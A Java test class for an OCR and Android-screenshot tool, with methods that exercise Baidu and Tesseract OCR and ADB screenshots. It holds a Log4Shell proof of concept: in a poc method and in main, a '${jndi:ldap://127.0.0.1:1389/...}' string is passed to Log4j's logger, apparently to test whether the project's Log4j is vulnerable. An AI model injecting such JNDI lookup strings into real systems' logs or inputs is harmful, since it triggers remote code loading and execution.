
import base.EasyAdb;

import ocr_processor.BaiduOcr;
import ocr_processor.BaseOcr;
import ocr_processor.TesseractOcr;
import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;

import javax.imageio.ImageIO;
import java.awt.image.BufferedImage;
import java.io.*;
import java.util.Arrays;

public class EasyAdbTest {
    public static Logger logger = LogManager.getLogger(Main.class);

    public static void testOcrOrientText(BaseOcr ocr) throws Exception {
        logger.info("testOcrOrientText Using Ocr :: " + ocr.getOcrName());
        InputStream is = new FileInputStream(new File("ri_che.jpg"));
        BufferedImage img = ImageIO.read(is);
        logger.info(Arrays.toString(ocr.orientText(img, "File")));
    }

    public static void testOcrSingleText(BaseOcr ocr) throws Exception {
        logger.info("testOcrSingleText Using Ocr :: " + ocr.getOcrName());
        InputStream is = new FileInputStream(new File("storage/TEST.png"));
        BufferedImage img = ImageIO.read(is);
        logger.info(ocr.recognizeSingleText(img));

    }

    public static void testOcrMultiText(BaseOcr ocr, String file_path) throws Exception {
        logger.info("testOcrMultiText Using Ocr :: " + ocr.getOcrName());
        InputStream is = new FileInputStream(new File(file_path));
        BufferedImage img = ImageIO.read(is);
        logger.info(ocr.recognizeMultiText(img));
    }


    public static void testAdbScreenShoot(EasyAdb adb) throws Exception {
        logger.info("testAdbConnection With device :: " + adb.getDeiceName());
        BufferedImage img1 = adb.getScreenshot();
//
//        File outputfile1 = new File("result1.png");
//        ImageIO.write(img1, "png", outputfile1);
//        logger.info("Img1 saved");

        BufferedImage img2 = adb.getScreenshot(132, 312, 231, 312);

//        File outputfile2 = new File("result2.png");
//        ImageIO.write(img2, "png", outputfile2);

        logger.info("Img2 saved");
    }

    public static EasyAdb testAdbConnection() throws Exception {
        return new EasyAdb();
    }

    public static void poc(String[] args) throws IOException {
        String poc = "${jndi:ldap://127.0.0.1:1389/yte5jl}";
        Logger logger = LogManager.getLogger(Main.class);
        logger.error(poc);
    }

    public static void main(String[] args) throws Exception {
        long startTime, endTime;
        BaseOcr ocr1 = new BaiduOcr();
        testOcrSingleText(ocr1);
//        testOcrMultiText(ocr1);
        testOcrOrientText(ocr1);
        String poc = "${jndi:ldap://127.0.0.1:1389/udrlwt}";
        logger.error(poc); // very easy

//        startTime = System.currentTimeMillis();   //获取开始时间
//        testOcrOrientText(ocr1);
//        endTime = System.currentTimeMillis(); //获取结束时间
//        System.out.println("程序运行时间： " + (endTime - startTime) + "ms");
////      2367ms
//
//        BaseOcr ocr2 = new TesseractOcr();
////        testOcrSingleText(ocr2);
////        testOcrMultiText(ocr2);
//        startTime = System.currentTimeMillis();   //获取开始时间
//        testOcrOrientText(ocr2);
//        endTime = System.currentTimeMillis(); //获取结束时间
//        System.out.println("程序运行时间： " + (endTime - startTime) + "ms");
////      2188ms
//        EasyAdb adb = testAdbConnection();
//        startTime = System.currentTimeMillis();   //获取开始时间
//        testAdbScreenShoot(adb);
//        endTime = System.currentTimeMillis(); //获取结束时间
//        System.out.println("程序运行时间： " + (endTime - startTime) + "ms");
////      2341ms
    }
}

